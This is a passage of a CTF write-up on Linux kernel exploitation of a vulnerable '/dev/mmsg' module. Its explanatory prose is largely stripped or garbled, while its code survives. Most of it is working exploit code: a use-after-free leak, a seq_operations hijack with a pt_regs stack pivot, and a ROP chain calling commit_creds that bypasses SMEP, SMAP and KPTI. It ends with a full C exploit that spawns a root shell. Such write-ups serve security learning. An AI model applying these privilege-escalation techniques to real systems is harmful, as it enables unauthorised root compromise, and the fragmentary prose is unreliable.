class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// </span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> 1</span></span><br><span class="line"> <span class="meta">#<span class="keyword">define</span> o(x) (x+kernel_offset)</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    <span class="comment">// smep userspacenon-executable</span></span><br><span class="line">    <span class="comment">// bypass: stack prviot</span></span><br><span class="line">    <span class="type">size_t</span> payload[<span class="number">0x40</span>];</span><br><span class="line">    <span class="type">int</span> idx=<span class="number">0</span>;</span><br><span class="line">    <span class="type">size_t</span> user_rip = (<span class="type">size_t</span>)get_shell;</span><br><span class="line"></span><br><span class="line">    payload[idx++] = o(pop_rbx_ret);</span><br><span class="line">    payload[idx++] = o(commit_creds);</span><br><span class="line">    payload[idx++] = o(pop_rdi_ret); <span class="comment">// return address</span></span><br><span class="line">    payload[idx++] = <span class="number">0x0</span>;</span><br><span class="line">    payload[idx++] = o(prepare_kernel_cred);</span><br><span class="line">    payload[idx++] = o(mov_edi_eax_call_rbx);</span><br><span class="line">    payload[idx++] = o(swapgs_restore_regs_and_return_to_usermode) + <span class="number">22</span>; </span><br><span class="line">    payload[idx++] = <span class="number">0x0</span>;</span><br><span class="line">    payload[idx++] = <span class="number">0x0</span>;</span><br><span class="line">    payload[idx++] = user_rip;</span><br><span class="line">    payload[idx++] = user_cs;</span><br><span class="line">    payload[idx++] = user_rflags;</span><br><span class="line">    payload[idx++] = user_rsp;</span><br><span class="line">    payload[idx++] = user_ss;</span><br><span class="line">    </span><br><span class="line">    put_mmsg(fd2, (<span class="type">char</span> *)&amp;payload);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// trigger seq_file-&gt;start</span></span><br><span class="line">    read(seq_fd, <span class="literal">NULL</span>, <span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>xchg </p><p>kernel panic<code>can&#39;t access memory in 0x????()</code></p><h3 id="2"><a href="#2" class="headerlink" title="2"></a>2</h3><p><a href="https://blog.wingszeng.top/kernel-pwn-struct-seq-operations-and-struct-pt-regs/#%E4%BE%8B%E9%A2%98-2023-pwnhub-%E5%85%AC%E5%BC%80%E8%B5%9B-kheap">Kernel Pwn Struct seq_operations and Struct pt_regs</a></p><ul><li>smap pwnhub smap: kernel space  access user space </li><li> <code>pt_regs</code> syscall <code></code>.</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pt_regs</span> &#123;</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * C ABI says these regs are callee-preserved. They aren&#x27;t saved on kernel entry</span></span><br><span class="line"><span class="comment"> * unless syscall needs a complete, fully filled &quot;struct pt_regs&quot;.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> r15;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> r14;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> r13;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> r12;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> rbp;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> rbx;</span><br><span class="line"><span class="comment">/* These regs are callee-clobbered. Always saved on kernel entry. */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> r11;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> r10;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> r9;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> r8;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> rax;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> rcx;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> rdx;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> rsi;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> rdi;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * On syscall entry, this is syscall#. On CPU exception, this is error code.</span></span><br><span class="line"><span class="comment"> * On hw interrupt, it&#x27;s IRQ number:</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> orig_rax;</span><br><span class="line"><span class="comment">/* Return frame for iretq */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> rip;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> cs;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> eflags;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> rsp;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> ss;</span><br><span class="line"><span class="comment">/* top of stack page */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><blockquote><p>, ,  r8 - r15,  pt_regs  syscall . .  rip  ( seq_operations), <code>add, rsp val; ret</code> gadget,  rsp  pt_regs ,  ROP .</p></blockquote><p> rop   pt_regs smap</p><p>: syscall  readseq_operations-&gt;startrop</p><p>+<a href="https://ywhkkx.github.io/2023/02/19/seq_operations%20+%20pt_regs/">seq_operations+pt_regs</a></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">__asm__(  </span><br><span class="line">    <span class="string">&quot;mov r15, 0x55555555;&quot;</span>  </span><br><span class="line">    <span class="string">&quot;mov r14, 0x44444444;&quot;</span>  </span><br><span class="line">    <span class="string">&quot;mov r13, 0x33333333;&quot;</span>   </span><br><span class="line">    <span class="string">&quot;mov r12, 0x22222222;&quot;</span>  </span><br><span class="line">    <span class="string">&quot;mov rbp, 0xbbbb1111;&quot;</span></span><br><span class="line">    <span class="string">&quot;mov rbx, 0xbbbb2222;&quot;</span>  </span><br><span class="line">    <span class="string">&quot;mov r11, 0x11111111;&quot;</span>  </span><br><span class="line">    <span class="string">&quot;mov r10, 0x11110000;&quot;</span>  </span><br><span class="line">    <span class="string">&quot;mov r9,  0x99999999;&quot;</span>  </span><br><span class="line">    <span class="string">&quot;mov r8,  0x88888888;&quot;</span>  </span><br><span class="line">    <span class="string">&quot;xor rax, rax;&quot;</span>  </span><br><span class="line">    <span class="string">&quot;mov rcx, 0x666666;&quot;</span>  </span><br><span class="line">    <span class="string">&quot;mov rdx, 8;&quot;</span>  </span><br><span class="line">    <span class="string">&quot;mov rsi, rsp;&quot;</span>  </span><br><span class="line">    <span class="string">&quot;mov rdi, seq_fd;&quot;</span>  </span><br><span class="line">    <span class="string">&quot;syscall&quot;</span>  </span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>gadget: rsp, add rsp, xxx; ret</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/2wi 0xffffffff81909b8c</span><br><span class="line">   0xffffffff81909b8c:  add    rsp,0x168</span><br><span class="line">   0xffffffff81909b93:  ret</span><br></pre></td></tr></table></figure><p>start pt_regs </p><p>kernel panicrippayload</p><p></p><h3 id="3"><a href="#3" class="headerlink" title="3"></a>3</h3><p>uaf</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// module_ioctl</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">mmsg_head</span> &#123;</span></span><br><span class="line">    <span class="type">char</span> description[<span class="number">16</span>];</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">list</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">case</span> MMSG_RECV: </span><br><span class="line">        <span class="keyword">if</span> (arg.top) &#123;</span><br><span class="line">            m = list_entry(&amp;mmsg_head-&gt;<span class="built_in">list</span>, <span class="keyword">struct</span> mmsg, <span class="built_in">list</span>);  <span class="comment">// head</span></span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            m = find_mmsg(arg.token);   <span class="comment">// </span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (m == <span class="literal">NULL</span> || arg.size &gt; m-&gt;size || arg.size &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">            ret = -EINVAL;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        printk(KERN_INFO <span class="string">&quot;mmsg recv\n&quot;</span>);</span><br><span class="line">        copy_to_user((<span class="type">void</span> __user *)arg.data, m-&gt;data, arg.size);</span><br><span class="line">        list_del(&amp;m-&gt;<span class="built_in">list</span>);  <span class="comment">// </span></span><br><span class="line">        kfree(m-&gt;data);      <span class="comment">// head  0x10 freelist</span></span><br><span class="line">        kfree(m);          </span><br><span class="line">        <span class="keyword">break</span>;</span><br></pre></td></tr></table></figure><h3 id="4"><a href="#4" class="headerlink" title="4"></a>4</h3><h4 id=""><a href="#" class="headerlink" title=""></a></h4><p>add rsp val</p><p> <code>0x100+</code> gadget0x100syscall</p><ul><li>ioctl </li></ul><h4 id=""><a href="#" class="headerlink" title=""></a></h4><ul><li>:  BUG: unable to handle page fault for address: 0000000044444444  RIP: 0010:0x44444444rip r14</li><li>syscall  r8-r15r8-r15sistart</li><li>r14-r8</li><li>si ?</li></ul><p><a href="https://b0ldfrev.gitbook.io/note/linux_kernel/kernelpwn-zhuang-tai-qie-huan-yuan-li-ji-kpti-rao-guo#0x2-bypass-kpti">KERNEL_PWNKPTI</a></p><p>swapgs; iretq ; ret rip,retiretq, r9user_rsp</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">swapgs            </span><br><span class="line">iretq             </span><br><span class="line">rsp ---&gt; rip </span><br><span class="line">         cs</span><br><span class="line">         rflags</span><br><span class="line">         rsp</span><br><span class="line">         ss</span><br></pre></td></tr></table></figure><p>swapgs_restore_regs_and_return_to_usermode: </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">swapgs_restore_regs_and_return_to_usermode + 22  </span><br><span class="line">0 // padding  </span><br><span class="line">0 // padding  </span><br><span class="line">get_shell</span><br><span class="line">user_cs  </span><br><span class="line">user_rflags  </span><br><span class="line">user_sp</span><br><span class="line">user_ss</span><br></pre></td></tr></table></figure><h4 id="errors"><a href="#errors" class="headerlink" title="errors"></a>errors</h4><ol><li>qemu cpu <code>host</code> kvm, kvmcpukvm64CPU</li></ol><h4 id="exploit"><a href="#exploit" class="headerlink" title="exploit"></a>exploit</h4><p>signal bypass kpti<code>SIGSEGV</code><code>SIGSEGV</code>shell<code>SIGSEGV</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> COLOR_GREEN <span class="string">&quot;\033[32m&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> COLOR_RED <span class="string">&quot;\033[31m&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> COLOR_YELLOW <span class="string">&quot;\033[33m&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> COLOR_DEFAULT <span class="string">&quot;\033[0m&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> log_debug(fmt, ...)                                                    \</span></span><br><span class="line"><span class="meta">  dprintf(2, <span class="string">&quot;[*] %s:%d &quot;</span> fmt <span class="string">&quot;\n&quot;</span>, __FILE__, __LINE__, ##__VA_ARGS__)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> log_info(fmt, ...)                                                     \</span></span><br><span class="line"><span class="meta">  dprintf(2, COLOR_GREEN <span class="string">&quot;[+] %s:%d &quot;</span> fmt <span class="string">&quot;\n&quot;</span> COLOR_DEFAULT, __FILE__,        \</span></span><br><span class="line"><span class="meta">          __LINE__, ##__VA_ARGS__)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> log_warning(fmt, ...)                                                  \</span></span><br><span class="line"><span class="meta">  dprintf(2, COLOR_YELLOW <span class="string">&quot;[!] %s:%d &quot;</span> fmt <span class="string">&quot;\n&quot;</span> COLOR_DEFAULT, __FILE__,       \</span></span><br><span class="line"><span class="meta">          __LINE__, ##__VA_ARGS__)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> log_error(fmt, ...)                                                    \</span></span><br><span class="line"><span class="meta">  dprintf(2, COLOR_RED <span class="string">&quot;[-] %s:%d &quot;</span> fmt <span class="string">&quot;\n&quot;</span> COLOR_DEFAULT, __FILE__,          \</span></span><br><span class="line"><span class="meta">          __LINE__, ##__VA_ARGS__)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> die(fmt, ...)                  \</span></span><br><span class="line"><span class="meta">  do &#123;                                 \</span></span><br><span class="line"><span class="meta">    log_error(fmt, ##__VA_ARGS__);          \</span></span><br><span class="line"><span class="meta">    log_error(<span class="string">&quot;Exit at line %d&quot;</span>, __LINE__); \</span></span><br><span class="line"><span class="meta">    exit(1);                           \</span></span><br><span class="line"><span class="meta">  &#125; while (0)</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">get_shell</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"> <span class="keyword">if</span>( getuid() ) &#123;</span><br><span class="line">  die(<span class="string">&quot;fail to get shell&quot;</span>);</span><br><span class="line"> &#125;</span><br><span class="line">    log_info(<span class="string">&quot;start to get root shell&quot;</span>);</span><br><span class="line"> system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line"> <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> user_cs, user_ss, user_rflags, user_rsp;</span><br><span class="line"><span class="type">void</span> <span class="title function_">save_status</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    __asm__(<span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_rsp, rsp;&quot;</span></span><br><span class="line">            <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">            <span class="string">&quot;pop user_rflags;&quot;</span></span><br><span class="line">            );</span><br><span class="line">    log_info(<span class="string">&quot;status saved&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">seq_open</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"> <span class="type">int</span> seq;</span><br><span class="line"> <span class="keyword">if</span> ( (seq=open(<span class="string">&quot;/proc/self/stat&quot;</span>, O_RDONLY)) == <span class="number">-1</span>) &#123;</span><br><span class="line">  die(<span class="string">&quot;seq open fail&quot;</span>);</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">return</span> seq;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MMSG_ALLOC 0x1111111</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MMSG_COPY 0x2222222</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MMSG_RECV 0x3333333</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MMSG_UPDATE 0x4444444</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MMSG_PUT_DESC 0x5555555</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MMSG_GET_DESC 0x6666666</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">mmsg_arg</span> &#123;</span></span><br><span class="line">        <span class="type">unsigned</span> <span class="type">long</span> token;</span><br><span class="line">        <span class="type">int</span> top;</span><br><span class="line">        <span class="type">int</span> size;</span><br><span class="line">        <span class="type">char</span> *data;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> kernel_base = <span class="number">0</span>;</span><br><span class="line"><span class="type">size_t</span> kernel_offset = <span class="number">0</span>;</span><br><span class="line"><span class="type">size_t</span> nokaslr = <span class="number">0xffffffff81000000</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> prepare_kernel_cred = <span class="number">0xffffffff9248d790</span>;</span><br><span class="line"><span class="type">size_t</span> commit_creds = <span class="number">0xffffffff8108d350</span>;</span><br><span class="line"><span class="type">size_t</span> swapgs_restore_regs_and_return_to_usermode = <span class="number">0xffffffff93000e30</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> pop_rdi_ret = <span class="number">0xffffffff811aa376</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> init_cred = <span class="number">0xffffffff8264c9a0</span>;</span><br><span class="line"><span class="type">size_t</span> swapgs_iretq = <span class="number">0xffffffff81c00ec6</span>;</span><br><span class="line"><span class="type">size_t</span> add_rsp_0x168_ret = <span class="number">0xffffffff81909b8c</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> mmsg_fd;</span><br><span class="line"><span class="type">int</span> seq_fd;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">exploit</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">    log_info(<span class="string">&quot;open device&quot;</span>);</span><br><span class="line">    mmsg_fd = open(<span class="string">&quot;/dev/mmsg&quot;</span>, O_RDWR);</span><br><span class="line">    <span class="keyword">if</span> (mmsg_fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        die(<span class="string">&quot;open device&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mmsg_arg</span> <span class="title">arg</span>;</span></span><br><span class="line">    arg.token = <span class="number">1</span>;</span><br><span class="line">    arg.top = <span class="number">1</span>;</span><br><span class="line">    arg.size = <span class="number">16</span>;</span><br><span class="line">    arg.data = <span class="built_in">malloc</span>(<span class="number">16</span>);</span><br><span class="line">    <span class="type">size_t</span> *buf = (<span class="type">size_t</span> *)arg.data;</span><br><span class="line">    buf[<span class="number">0</span>] = <span class="number">0x1145141145141145</span>ull;</span><br><span class="line">    buf[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">    ioctl(mmsg_fd, MMSG_PUT_DESC, &amp;arg);  <span class="comment">// bypass size check</span></span><br><span class="line">    ioctl(mmsg_fd, MMSG_RECV, &amp;arg);     <span class="comment">// free head</span></span><br><span class="line"></span><br><span class="line">    seq_fd = seq_open();</span><br><span class="line"></span><br><span class="line">    ioctl(mmsg_fd, MMSG_GET_DESC, &amp;arg);</span><br><span class="line">    log_warning(<span class="string">&quot;start leak info&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">2</span>; i ++) &#123;</span><br><span class="line">        log_debug(<span class="string">&quot;buf[%d] =&gt; 0x%lx\n&quot;</span>, i, buf[i]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    kernel_base = buf[<span class="number">0</span>] - <span class="number">0x20fac0</span>;</span><br><span class="line">    kernel_offset = kernel_base - nokaslr;</span><br><span class="line">    add_rsp_0x168_ret += kernel_offset;</span><br><span class="line">    pop_rdi_ret += kernel_offset;</span><br><span class="line">    init_cred += kernel_offset;</span><br><span class="line">    commit_creds += kernel_offset;</span><br><span class="line">    swapgs_iretq += kernel_offset;</span><br><span class="line"></span><br><span class="line">    log_info(<span class="string">&quot;kernel_offset =&gt; 0x%lx&quot;</span>, kernel_offset);</span><br><span class="line">    log_info(<span class="string">&quot;kernel_base =&gt; 0x%lx&quot;</span>, kernel_base);</span><br><span class="line"></span><br><span class="line">    buf[<span class="number">0</span>] = add_rsp_0x168_ret;</span><br><span class="line">    log_info(<span class="string">&quot;pollute =&gt; 0x%lx, maybe we can debug here&quot;</span>, buf[<span class="number">0</span>]);</span><br><span class="line">    ioctl(mmsg_fd, MMSG_PUT_DESC, &amp;arg);</span><br><span class="line">    getchar();</span><br><span class="line"></span><br><span class="line">    __asm__(</span><br><span class="line">        <span class="string">&quot;mov r15,   0xbeefdead;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r14,   pop_rdi_ret;&quot;</span>   <span class="comment">// &lt;- rip here</span></span><br><span class="line">        <span class="string">&quot;mov r13,   init_cred;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r12,   commit_creds;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rbp,   swapgs_iretq;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rbx,   0x55555555;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r11,   0x66666666;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r10,   0x77777777;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r9,    user_rsp;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r8,    0x99999999;&quot;</span></span><br><span class="line">        <span class="string">&quot;xor rax,   rax;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rcx,   0xaaaaaaaa;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rdx,   8;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rsi,   rsp;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rdi,   seq_fd;&quot;</span>        <span class="comment">//  seq_operations-&gt;stat </span></span><br><span class="line">        <span class="string">&quot;syscall&quot;</span></span><br><span class="line">    );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    signal(SIGSEGV, get_shell);</span><br><span class="line">    save_status();</span><br><span class="line">    exploit();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>bypass kpticr3 <code>+22</code> gadget</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span 